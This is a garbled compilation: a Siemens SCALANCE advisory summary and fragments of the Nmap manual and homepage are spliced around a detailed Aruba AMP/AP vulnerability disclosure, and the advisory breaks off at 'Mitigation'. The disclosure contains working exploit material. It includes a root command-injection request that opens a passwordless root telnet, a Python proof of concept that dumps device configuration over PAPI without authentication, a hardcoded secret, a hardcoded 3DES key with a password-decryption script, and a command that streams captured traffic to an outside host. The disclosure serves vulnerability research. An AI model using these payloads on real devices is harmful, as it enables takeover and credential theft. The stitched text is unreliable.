SUMMARY

Siemens SCALANCE W1750D is a brandlabled device. Aruba has released a related security advisory
(ARUBA-PSA-2016-004) [0] disclosing vulnerabilities in its Aruba Instant product line. The advisory
contains multiple related vulnerabilities that are summarized in CVE-2016-2031.

This advisory is a reminder to customers that the PAPI protocol is not a secure protocol and that some
device conﬁgurations must be taken to mitigate risks. Although this information was previously disclosed,
an impending public disclosure by the Google Security Team (focused on Aruba Instant) will call out the
vulnerable details of this protocol and bring it to the attention of the attacker community.

Siemens recommends speciﬁc countermeasures until ﬁxes are available.

VULNERABILITY CLASSIFICATION

The vulnerability classiﬁcation has been performed by using the CVSS scoring system in version 3.1
(CVSS v3.1) (https://www.ﬁrst.org/cvss/). The CVSS environmental score is speciﬁc to the customer’s
environment and will impact the overall CVSS score. The environmental score should therefore be
individually deﬁned by the customer to accomplish ﬁnal scoring.

An additional classiﬁcation has been performed using the CWE classiﬁcation, a community-developed list
of common software security weaknesses. This serves as a common language and as a baseline for
weakness identiﬁcation, mitigation, and prevention efforts. A detailed list of CWE classes can be found at:
https://cwe.mitre.org/.

Vulnerability CVE-2016-2031

Multiple vulnerabilities exists in Aruba Instate before 4.1.3.0 and 4.2.3.1 due to insufﬁcient validation
of user-supplied input and insufﬁcient checking of parameters, which could allow a malicious user to
bypass security restrictions, obtain sensitive information, perform unauthorized actions and execute
arbitrary code.

## Name

nmap — Network exploration tool and security / port scanner

## Synopsis

`nmap` [
*`<Scan Type>`*
...] [
*`<Options>`*
] {
*`<target specification>`*
}

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

Vulnerability Details
=====================

---------------------------------------------
1. AMP: RabbitMQ Management interface exposed
---------------------------------------------

AMPs expose the management frontend for the RabbitMQ message queue on all
interfaces via tcp/15672 and tcp/55672.

  # netstat -nltp | grep beam
  tcp        0      0 127.0.0.1:5672              0.0.0.0:*
       LISTEN      2830/beam.smp
  tcp        0      0 127.0.0.1:17716             0.0.0.0:*
       LISTEN      2830/beam.smp
  tcp        0      0 0.0.0.0:15672               0.0.0.0:*
       LISTEN      2830/beam.smp
  tcp        0      0 0.0.0.0:55672               0.0.0.0:*
       LISTEN      2830/beam.smp

The password for the default user "airwave" is stored in the world readable
file /etc/rabbitmq/rabbitmq.config in plaintext:

  # ls -l /etc/rabbitmq/rabbitmq.config
  -rw-r--r-- 1 root root 275 Oct 28 15:48 /etc/rabbitmq/rabbitmq.config
  # grep default_ /etc/rabbitmq/rabbitmq.config
          {default_user,<<"airwave">>},
          {default_pass,<<"***REMOVED***">>}

--------------------------------------------------
2. AMP: XSRF token uses weak calculation algorithm
--------------------------------------------------

The XSRF token is calculated based on limited sources of entropy, consisting of
the user's time of login and a random number between 0 and 99999. The algorithm
Is approximated by the following example Python script:

  base64.b64encode(hashlib.md5('%d%5.5d' % (int(time.time()),
random.randint(0,99999))).digest())

-----------------------------------------------
3. AMP: Arbitrary modification of /etc/ntp.conf
-----------------------------------------------

Incorrect/missing filtering of input parameters allows injecting new lines and
arbitrary commands into /etc/ntp.conf, when updating the NTP settings via the
web frontend.

  POST /nf/pref_network? HTTP/1.1
  Host: 192.168.131.162
  [...]

  id=&ip_1=192.168.131.162&hostname_1=foo.example.com&
  subnet_mask_1=255.255.255.248&gateway_1=192.168.131.161&dns1_1=172.16.255.1&
  dns2_1=&eth1_enabled_1=0&eth1_ip_1=&eth1_netmask_1=&
  ntp1_1=time1.example.com%0afoo&ntp2_1=time2.example.com&save=Save

The above POST requests results in the following ntp.conf being generated:

  # cat /etc/ntp.conf
  [...]
  server time1.example.com
  foo
  server time2.example.com

------------------------------------------------------------------------------
4. AMP: PAPI uses static key for calculating validation checksum (auth bypass)
------------------------------------------------------------------------------

PAPI packets sent from an AP to an AMP are authenticated with a cryptographic
checksum. The packet format is only partially known, as it's a proprietary
format created by Aruba. A typical PAPI packet sent to an AMP is as follows:

  0000   49 72 00 02 64 69 86 2d 7f 00 00 01 01 00 01 00  Ir..di.-........
  0010   20 1f 20 1e 00 01 00 00 00 01 3e f9 22 49 05 b3   . .......>."I..
  0020   50 89 40 d3 5d 9d d6 af 46 98 c1 a6              P.@.]...F...

The following dissection of the above shown packet gives a more detailed
overview of the format:

  49 72                                                 ID
  00 02                                                 Version
  64 69 86 2d                                           PAPI Destination IP
  7f 00 00 01                                           PAPI Source IP
  01 00                                                 Unknown1
  01 00                                                 Unknown2
  20 1f                                                 PAPI Source Port
  20 1e                                                 PAPI Destination Port
  00 01                                                 Unknown3
  00 00                                                 Unknown4
  00 01                                                 Sequence Number
  3e f9                                                 Unknown5
  22 49 05 b3 50 89 40 d3 5d 9d d6 af 46 98 c1 a6       Checksum

The checksum is based on a MD5 hash of a padded concatenation of all fields and
a secret token. The secret token is hardcoded in multiple binaries on the AMP
and can easily be retrieved via core Linux system tools:

  $ strings /opt/airwave/bin/msgHandler | grep asd
  asdf;lkj763

Using this secret token it is possible to craft valid PAPI packets and issue
commands to the AMP, bypassing the authentication based on the shared
secret / token. This can be exploited to compromise of the device.
Random sampling of different software versions available on
Aruba's website confirmed that the shared secret is identical for all versions.

-------------------------------------------------------
5. AP: Insecure transmission of login credentials (GET)
-------------------------------------------------------

Username and password to authenticate with the AP web frontend are transmitted
through HTTP GET. This method should not be used in a form that transmits
sensitive data, because the data is displayed in clear text in the URL.

  GET /swarm.cgi?opcode=login&user=admin&passwd=admin HTTP/1.1

The login URL can potentially appear in Proxy logs, the server logs or
browser history. This possibly discloses the authentication data to
unauthorized persons.

--------------------------------------------
6. AP: Built in privileged "support" account
--------------------------------------------

The APs provide a built in system account called "support". When connected to
the restricted shell of the AP via SSH, issuing the command "support", triggers
a password request:

  00:0b:86:XX:XX:XX# support
  Password:

A quick internet search clarified, that this password is meant for use by Aruba
engineers only:
<http://community.arubanetworks.com/t5/Unified-Wired-Wireless-Access/OS5-0-support-password/td-p/26760>

Further research on that functionality lead to the conclusion that this
functionality provides root-privileged shell access to the underlying operating
system of the AP, given the correct password is entered.

-----------------------------------------------
7. AP: Static password hash for support account
-----------------------------------------------

The password hash for the "support" account mentioned in vulnerability #6 is
stored in plaintext on the AP.

  $ strings /aruba/bin/cli | grep ^bc5
  bc54907601c92efc0875233e121fd3f1cebb8b95e2e3c44c14

Random sampling of different versions of Firmware images available on Aruba's
website confirmed that the password hash is identical for all versions. The
password check validating a given "support" password is based on the following
algorithm:

  SALT + sha1(SALT + PASSWORD)

Where SALT equals the first 5 bytes of the password hash in binary
representation. It is possible to run a brute-force attack on this hash format
using JtR with the following input format:

  support:$dynamic_25$c92efc0875233e121fd3f1cebb8b95e2e3c44c14$HEX$bc54907601

------------------------------------------------------
8. AP: Unusual account identified ("arubasecretadmin")
------------------------------------------------------

The AP's system user configuration contains a undocumented account called
"arubasecretadmin". This account was the root cause for CVE-2007-0932 and
allowed administrative login with a static password.

  /etc/passwd:
  nobody:x:99:99:Nobody:/:/sbin/nologin
  root:x:0:0:Root:/:/bin/sh
  admin:x:100:100:Admin:/:/bin/telnet3
  arubasecretadmin:x:101:100:Aruba Admin:/:/bin/telnet2
  serial:x:102:100:Serial:/:/bin/telnet4

Further tests indicated that login with this account seems not possible as it
is not mapped through Arubas authentication mechanisms. The reason for it being
still configured on the system is unknown.

---------------------------------------
9. AP: Privileged remote code execution
---------------------------------------

Insufficient checking of parameters allows an attacker to execute commands
with root privileges on the AP. The vulnerable parameter is "image_url" which
is used in the Firmware update function.

  GET
/swarm.cgi?opcode=image-url-upgrade&ip=127.0.0.1&oper_id=6&image_url=Aries@<http://10.0.0.1/?"`/usr/sbin/mini_httpd+-d+/+-u+root+-p+1234+-C+/etc/mini_httpd.conf`"&auto_reboot=false&refresh=true&sid=OWsiU5MM7DxVf9FRWe3P&nocache=0.9368100591919084>
HTTP/1.1

The above example starts a new instance of mini_httpd on tcp/1234, which allows
browsing the AP's filesystem. The following list of commands, if executed in
order, start a telnet service that allows passwordless root login.

  killall -9 utelnetd
  touch /tmp/telnet_enable
  echo \#\!/bin/sh > /bin/login
  echo /bin/sh >> /bin/login
  chmod +x /bin/login
  /sbin/utelnetd

Connecting to the telnet service started by the above command chain:

  # telnet 10.0.XX.XX
  Trying 10.0.XX.XX...
  Connected to 10.0.XX.XX.
  Escape character is '^]'.
  Switching to Full Access
  /aruba/bin # echo $USER
  root
  /aruba/bin #

Potential exploits of this vulnerability can be detected through the
AP's log file:
  [...]
  Jan  1 02:43:47  cli[2052]: <341004> <WARN> |AP
00:0b:86:XX:XX:XX2 () 10 0 XX XX cli|
<http://10.0.XX.XX/?"`/sbin/utelnetd`">;
  [...]

-------------------------------------------------------
10. AP: Radius passwords allow arbitrary raddb commands
-------------------------------------------------------

Insufficient checking of the GET parameter "cmd" allows the injection of
arbitrary commands and configuration parameters in the raddb configuration.

Example:
  GET
/swarm.cgi?opcode=config&ip=127.0.0.1&cmd=%27user%20foo%20foo%22,my-setting%3d%3d%22blah%20portal%0Ainbound-firewall%0Ano%20rule%0Aexit%0A%27&refresh=false&sid=Lppj9jT2xQmYKqjEx5eP&nocache=0.10862623626107548
HTTP/1.1

  /aruba/radius/raddb/users:
  foo Filter-Id == MAC-GUEST, Cleartext-Password := "foo",my-setting=="blah"

As shown in the above example, inserting a double-quote in the password allows
to add additional commands after the password.

-----------------------------------------------------------
11. AP: Unauthenticated disclosure of environment variables
-----------------------------------------------------------

It is possible to request a listing of environment variables by requesting a
specific URL on the AP's web server. The request does not require
authentication.

  GET /swarm.cgi?opcode=printenv HTTP/1.1

  HTTP/1.0 200 OK
  Content-Type:text/plain; charset=utf-8
  Pragma: no-cache
  Cache-Control: max-age=0, no-store

  Environment variables

  CHILD_INDEX=0

  GATEWAY_INTERFACE=CGI/1.1
  SERVER_PROTOCOL=HTTP/1.0
  SERVER_PORT=4343

Gecko/20100101 Firefox/38.0 Iceweasel/38.3.0
  HTTP_HOST=10.0.XX.XX:4343

-----------------------------------------------------------------
12. AP: Information disclosure by firmware checking functionality
-----------------------------------------------------------------

When the AP checks device.arubanetworks.com for a new firmware version, it
sends detailed information of the AP in plaintext to the remote host.

  POST /firmware HTTP/1.1
  Host: device.arubanetworks.com
  Content-Length: 2
  Connection: keep-alive
  X-Type: firmware-check
  X-Guid: 2dbe42XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  X-OEM-Tag: Aruba
  X-Mode: IAP
  X-Factory-Default: Yes
  X-Current-Version: 6.4.2.6-4.1.1.10_51810
  X-Organization: ***REMOVED (Company Internal Name)***
  X-Ap-Info: CC00XXXXX, 00:0b:86:XX:XX:XX, RAP-155
  X-Features: 0000100001001000000000000000000000000000000000010000000

----------------------------------------------------------
13. AP: Unauthenticated automated firmware update requests
----------------------------------------------------------

The web frontend of the AP provides functionality to initiate an automated
firmware update. Doing so triggers the AP to initiate communication with
device.arubanetworks.com and automatically download and install a new firmware
image. The CGI opcode for that automatic update is "image-server-check" and it
was discovered that the "sid" parameter is not checked for this opcode. Therefor
an attacker can issue the automatic firmware update without authentication by
sending the following GET request to the AP.

  GET /swarm.cgi?opcode=image-server-check&ip=127.0.0.1&sid=x

As shown above, the "sid" parameter has to be submitted as part of the URL, but
can be set to anything. Although all opcode actions follow the same calling
scheme, "image-server-check" was the only opcode where the session ID was not
validated.

Combined with other vulnerabilities (#14, #15), this could be exploited to
install an outdated, vulnerable firmware on the AP.

----------------------------------------------------
14. AP: Firmware updater does not check certificates
----------------------------------------------------

The communication between AP and device.arubanetworks.com is secured by using
SSL. The AP does not do proper certificate validation for the communication to
device.arubanetworks.com. A typical SSL MiTM attack using DNS spoofing and a
self-signed certificate allowed interception of the traffic between AP and
device.arubanetworks.com.

--------------------------------------------------
15. AP: Forceful downgrade of FW versions possible
--------------------------------------------------

When checking device.arubanetworks.com for a new firmware image, the AP sends
it's current version to the remote host. If there is no new firmware available,
device.arubanetworks.com does not provide any download options. If the initial
version sent from the AP is modified by an attacker (via MiTM), the remote
server will reply with the current firmware version. The AP will then reject
that firmware, as it's current version is more recent/the same. Downgrading the
version does also not work based on the validation the AP does.
This behaviour can be overwritten if an attacker intercepts and modifies the
reply from device.arubanetworks.com and adds X-header called
"X-Mandatory-Upgrade".

Example of a spoofed reply from device.arubanetworks.com:

  HTTP/1.0 200 OK
  Date: Wed, 11 Nov 2015 12:12:20 GMT
  Content-Length: 91
  Content-Type: text/plain; charset=UTF-8
  X-Activation-Key: FXXXXXXX
  X-Session-Id: 05d607dd-958b-42c4-a355-bd54e1a32e8e
  X-Status-Code: success
  X-Type: firmware-check
  X-Mandatory-Upgrade: true
  Connection: close

  6.4.2.6-4.1.1.10_51810
  23 <http://10.0.0.1:4321/ArubaInstant_Aries_6.4.2.6-4.1.1.10_51810>

As shown above, the Header "X-Mandatory-Upgrade" was added to the server's
reply. This causes the AP to skip its validation checks and accept any firmware
version provided, regardless if it is the same or older than the current one.

-----------------------------------------------------------
16. AP: Firmware update check discloses machine certificate
-----------------------------------------------------------

While observing the traffic between an AP and device.arubanetworks.com, it was
discovered that the AP discloses it's machine certificate to the remote
endpoint.

  POST /firmware HTTP/1.1
  Host: 10.0.XX.XX
  Content-Length: 2504
  Connection: close
  X-Type: firmware-check
  X-Guid: 2dbe42XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  X-OEM-Tag: Aruba
  X-Mode: IAP
  X-Factory-Default: Yes
  X-Session-Id: e0b24fb1-e2f7-4e06-9473-1266b50a3fec
  X-Current-Version: 6.4.2.6-4.1.1.10_51810
  X-Organization: ***REMOVED (Company Internal Name)***
  X-Ap-Info: CC00XXXXX, 00:0b:86:XX:XX:XX, RAP-155
  X-Features: 0000100001001000000000000000000000000000000000010000000
  X-Challenge-Hash: SHA-1

  -----BEGIN CERTIFICATE-----
  MIIGTjCCBTagAwI...
  [...]
  -----END CERTIFICATE-----

The certificate sent in the above request is the same (in PEM format) as found
under the following path on the AP:

  /tmp/deviceCerts/certifiedKeyCert.der

Comparison of the certificate from the HTTP Request and from the AP filesystem:

  $ sha256sum dumped-fw-cert.txt certifiedKeyCert.der.pem
  68ebb521dff53d8dcb8e4a0467dcae38cf45a0d812897393632bdd9ef6f354e8
dumped-fw-cert.txt
  68ebb521dff53d8dcb8e4a0467dcae38cf45a0d812897393632bdd9ef6f354e8
certifiedKeyCert.der.pem

---------------------------------------------------------
17. AP: Firmware is downloaded via unencrypted connection
---------------------------------------------------------

Firmware images are downloaded via unencrypted HTTP to the AP. An example reply
containing the download paths looks as follows:

  HTTP/1.1 200 OK
  Date: Wed, 11 Nov 2015 13:18:58 GMT
  Content-Length: 552
  Content-Type: text/plain; charset=UTF-8
  X-Activation-Key: FXXXXXXX
  X-Session-Id: 05d607dd-958b-42c4-a355-bd54e1a32e8e

  X-Type: firmware-check
  Connection: close

  6.4.2.6-4.1.1.10_51810

  26 <http://images.arubanetworks.com/fwfiles/ArubaInstant_Pegasus_6.4.2.6-4.1.1.10_51810>

An attacker could potentially MiTM connections to images.arubanetworks.com and
possibly replace the firmware images downloaded by the AP.

----------------------------------------------------------------------
18. AP: Firmware update Challenge/Response does not protect the Client
----------------------------------------------------------------------

The update check process between AP and device.arubanetworks.com works
as follows:

  AP => device.arubanetworks.com
  POST /firmware
  X-Type: firmware-check

  AP <= device.arubanetworks.com
        200 OK
        X-Session-Id: bd4...
        X-Challenge: 123123...

  AP => device.arubanetworks.com
  POST /firmware
  X-Session-Id: bd4...

  [machine certificate]
  [signature]

  AP <= device.arubanetworks.com
        200 OK
        X-Session-Id: bd4...

        [firmware image urls]

When inspecting the communication process carefully, it is clear that the final
response from device.arubanetworks.com does not contain any (cryptographic)
signature. An attacker could impersonate device.arubanetworks.com, send an
arbitrary challenge, ignore the response and just reply with a list of firmware
images. The only thing that has to be kept the same over requests is the
X-Session-Id header, which is also sent initially by the remote host and not
the AP and therefore under full control of the attacker.

------------------------------------------
19. AP: Unencrypted private keys and certs
------------------------------------------

The AP firmware image contains the unencrypted private key and certificate for
securelogin.arubanetworks.com issued by GeoTrust and valid until 2017. The key
and cert was found under the path /aruba/conf/cpprivkey.pem.

  $ openssl x509 -in cpprivkey.pem -text -noout
  Certificate:
      Data:
          Version: 3 (0x2)

  $ openssl rsa -in cpprivkey.pem -check
  RSA key ok

  -----BEGIN RSA PRIVATE KEY-----
  MIIEpQIBAAKCAQEA….
  [...]
  -----END RSA PRIVATE KEY-----

---------------------------------------
20. AP: Potential signature private key
---------------------------------------

A potential SSL key was found under the path /etc/sig.key. Based on the header
(3082xxxx[02,03]82), the file looks like a SSL key in DER format:

$ xxd etc/sig.key
00000000: 3082 020a 0282 0201 00d9 2d71 db0f decb  0.........-q....

It was not possible to decode the key. Therefore it's not 100% clear if is an
actual key or just a garbaged file.

------------------------------------------------
21. AP: PAPI Endpoints exposed to all interfaces
------------------------------------------------

The PAPI endpoint "msgHandler" creates listeners on all interfaces. Therefore
it is reachable via wired and wireless connections to the AP. This increases
the potential attack surface.

  # netstat -nlu | grep :82
  udp        0      0 :::8209                 :::*
  udp        0      0 :::8211                 :::*

Additionally the local ACL table of the AP contains a default firewall rule,
permitting any traffic to udp/8209-8211, overwriting any manually set ACL to
block access to PAPI:

  00:0b:86:XX:XX:XX# show datapath acl 106
  Datapath ACL 106 Entries
  -----------------------
  Flags: P - permit, L - log, E - established, M/e - MAC/etype filter
        S - SNAT, D - DNAT, R - redirect, r - reverse redirect m - Mirror
        I - Invert SA, i - Invert DA, H - high prio, O - set prio, C -
Classify Media
        A - Disable Scanning, B - black list, T - set TOS, 4 - IPv4, 6 - IPv6
        K - App Throttle, d - Domain DA

   1:  any  any  17 0-65535 8209-8211  P4
  [...]
  12:  any  any  any  P4
  00:0b:86:XX:XX:XX#

------------------------------------------------------
22. AP: PAPI Endpoint does not validate MD5 signatures
------------------------------------------------------

MD5 signature validation for incoming PAPI packets is disabled on the AP:

  # ps | grep msgHandler
   1988 root        508 S < /aruba/bin/msgHandler -n

  # /aruba/bin/msgHandler -h
  usage: msgHandler [-d] [-n]
  -d = enable debug prints.
  -n = disable md5 signatures.
  -g = disable garbling.

The watchdog service ("nanny") also restarts the PAPI handler with disabled MD5
signature validation:

  # grep msgH /aruba/bin/nanny_list
  RESTART /aruba/bin/msgHandler -n

--------------------------------------------------------------
23. AP: PAPI protocol encrypted with weak encryption algorithm
--------------------------------------------------------------

PAPI packets sent to an AP contain an encrypted payload. The encryption seems
to replace the MD5 signature check as described in #4 and used when PAPI is
sent from AP to AMP. This might also explain why the PAPI endpoint runs with
disabled MD5 signature verification on the AP (see #22).

The following example shows an encrypted PAPI packet for the command
"show version" as received by the AP:

  0000  49 72 00 03 7f 00 00 01 0a 00 00 01 00 00 20 13   Ir............ .
  0010  3b 60 3b 7e 20 04 00 00 00 03 00 00 00 00 00 00   ;`;~ ...........
  0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
  0030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
  0040  00 00 00 00 00 00 00 00 00 00 00 00 97 93 93 93   ................
  0050  a9 97 93 93 92 6e 96 99 93 93 92 95 94 91 93 97   .....n..........

  0070  fa e1 f7 e9 d1 a6 f7 e7 c5 eb f1 93 93 9e e0 fb   ................
  0080  fc e4 b3 e5 f6 e1 e0 fa fc fd 99                  ...........

Important parts of the above packet:

  7f 00 00 01         Destination IP (127.0.0.1)
  0a 00 00 01         Source IP (10.0.0.1)
  3b 60               Destination Port (15200)
  3b 7e               Source Port (15230)
  97 93 93 93-EOF     Encrypted PAPI payload

Comparison of the above packet with a typical PAPI packet that is sent from the
AP to the AMP quickly highlights the missing 0x00 that are used to pad certain
fields of the PAPI payload. These 0x00 seem to be substituted with 0x93, which
is a clear indication that the payload is "encrypted" with a 1 byte XOR. As
XOR'ing 0x00 with 1 byte results in the same byte, the payload therefore
discloses the key used and use of the weak XOR algorithm:

    0x00: 00000000
  ^ 0x93: 10010011
  ================
          10010011 (0x93)

The following shows the above PAPI packet for "show version" with its payload
decrypted:

  0000  49 72 00 03 7f 00 00 01 0a 00 00 01 00 00 20 13   Ir............ .
  0010  3b 60 3b 7e 20 04 00 00 00 03 00 00 00 00 00 00   ;`;~ ...........
  0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
  0030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
  0040  00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00   ................

  0080  6f 77 20 76 65 72 73 69 6f 6e 0a                  ow version.

(The string starting with "zxr..." is a HTTP session ID, see #25 on details how
to bypass this).

An example Python function for en-/decrypting PAPI payloads could look like
this:

  def aruba_encrypt(s):
    return ''.join([chr(ord(c) ^ 0x93) for c in s])

-------------------------------------------
24. AP: PAPI protocol authentication bypass
-------------------------------------------

Besides it's typical use between different Aruba devices, PAPI is also used as
an inter-process communication (IPC) mechanism between the CGI based web
frontend and the backend processes on the AP. Certain commands that can be sent
via PAPI are only supposed to be used via this IPC interface and not from an
external source. Besides the weak "encryption" that is described in #23, some
PAPI packets contain a HTTP session ID (SID), that matches the SID issued at
login to the web frontend.

Example IPC packet (payload decrypted as shown in #23):

  0000  49 72 00 03 7f 00 00 01 0a 00 00 01 00 00 20 13   Ir............ .
  0010  3b 60 3b 7e 20 04 00 00 00 03 00 00 00 00 00 00   ;`;~ ...........
  0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................

The SID in the example shown is "zxroCOUwnirdzB5dtVxb". The 0x14 before that
indicates the length of the 20 byte SID. If the session is expired or an
invalid session is specified, the packet is rejected by the PAPI endpoint
(msgHandler).

Replacing the 20 byte SID with 20 * 0x00, bypasses the SID check and therefore
allows unauthenticated PAPI communication with the AP.

Example IPC packet (Session ID replaced with 20 * 0x00, payload not XOR'ed for
readability):

  0090  0a

Using the above example, it is possible to request the system configuration
from an AP, bypassing all authentication methods.

If the above packet is sent using IPC from the webfrontend cgi to the backend,
(localhost) the reply looks like follows:

msg_ref 303 /tmp/.cli_msg_SW9iVE

The cgi binary then reads this file and renders the content in the HTTP reply.
If the PAPI packet comes from an external address (instead of localhost) the
reply points to the APs web server (10.0.0.26 in this case) instead of /tmp/:

msg_ref 2689 <http://10.0.0.26/.cli_msg_n011xh>

Access to this file does not require authentication which raises the severity
of this vulnerability significantly.

The following Python script is a proof of concept for this vulnerability,
sending a "show configuration" packet to an AP with the IP address 10.0.0.26:

  import socket
  def aruba_encrypt(s):
    return ''.join([chr(ord(c) ^ 0x93) for c in s])
  header = (
    '\x49\x72\x00\x03\x7f\x00\x00\x01\x0a\x00\x00\x01\x00\x00\x20\x13'
    '\x3b\x60\x3b\x7e\x20\x04\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00'
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
  )
  payload = (  # show configuration
    '\x04\x00\x00\x00\x40\x04\x00\x00\x01\xfd\x05\x0a\x00\x00\x01\x06'
    '\x07\x02\x00\x04\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00'
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    '\x00\x13\x73\x68\x6f\x77\x20\x63\x6f\x6e\x66\x69\x67\x75\x72\x61'
    '\x74\x69\x6f\x6e\x0a'
  )
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  sock.bind(('', 1337))
  sock.sendto(header + aruba_encrypt(payload), ('10.0.0.26', 8211))
  buff = sock.recvfrom(4096)
  print aruba_encrypt(buff[0])

Executing the above PoC:

  # python arupapi.py
  [...]msg_ref 2689 <http://10.0.0.26/.cli_msg_n011xh>

Downloading the file referenced by the reply returns the full AP configuration,
including all users, passwords and settings (no auth is required on the HTTP
request either):

  # curl -Lk <http://10.0.0.26/.cli_msg_n011xh>
  version 6.4.2.0-4.1.1
  virtual-controller-country XX
  virtual-controller-key b49ff***REMOVED***
  name instant-XX:XX:XX
  terminal-access
  clock timezone none 00 00
  rf-band all
  [...]
  mgmt-user admin f9ac59cd431e174fb07539a8a811a1aa
  [...]
  (full configuration file continues)

For APs running in "managed mode", the above shown exploit does not work. The
reason for that is, that these APs don't provide a web server and have only a
limited set of commands that can be executed via PAPI.

Additionally, APs in managed mode do not seem to use the XOR based "encryption"
or MD5 checksums - there was no authentication/encryption found at all.

One interesting payload for APs in "managed mode" using the limited subset of
available commands is the ability to capture traffic and send it to a remote
endpoint via UDP. The example command on the controller would be:

  (aruba_7030_1) #ap packet-capture raw-start ip-addr 192.168.0.1
100.105.134.45 1337 0 radio 0

This command would send all traffic of AP 192.168.0.1 from the first radio
interface in PCAP format to 100.105.134.45:1337. Wrapped in PAPI, the Packet
would look like this:

25. AP: Broadcast with detailed system information (LLDP)
---------------------------------------------------------

Aruba APs broadcast detailed system and version information to the wired
networks via LLDP (Link Layer Discovery Protocol).

The broadcast packet contains the APs MAC address, model number and exact
firmware version.This detailed information could aid an attacker to easily find
and identify potential targets for known vulnerabilities.

------------------------------------------------------
26. AP: User passwords are encrypted with a static key
------------------------------------------------------

Based on the vulnerability shown in #24 which potentially discloses the
password hashes of AP user accounts, the implemented hashing algorithm was
tested. CVE-2014-7299 describes the password hashes as "encrypted password
hashes". The following line shows the mgmt-user configuration for the user
"admin" with password "admin":

  mgmt-user admin f9ac59cd431e174fb07539a8a811a1aa

Some testing with various passwords and especially password lengths showed that
the passwords are actually encrypted and not hashed (as hash algorithms produce
the same length output for different length input):

  f9ac59cd431e174fb07539a8a811a1aa                 # admin
  d7a75c655b8e2fb8609d0b04275e02767f2dfae8c63088cf # adminadmin

The encryption algorithm used for the above passwords turned out to be 3DES in
CBC mode. The encryption algorithm uses a 24 byte static key which is hardcoded
on the AP. Sampling of different Firmware versions confirmed that the key is
identical for all available versions. The IV required for 3DES consists of 8
random bytes, and is stored as the first 8 byte of the encrypted password. The
following Python script can be used to decrypt the above hashes:

  import pyDes
  hashes = (
    'f9ac59cd431e174fb07539a8a811a1aa', # admin
    'd7a75c655b8e2fb8609d0b04275e02767f2dfae8c63088cf' # adminadmin
  )
  key = (
    '\x32\x74\x10\x84\x91\x17\x75\x46\x14\x75\x82\x92'
    '\x43\x49\x04\x59\x18\x69\x15\x94\x27\x84\x30\x03'
  )
  for h in hashes:
    d = pyDes.triple_des(key, pyDes.CBC, h.decode('hex')[:8], pad='\00')
    print h, '=>', d.decrypt(h.decode('hex')[8:])

Mitigation

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
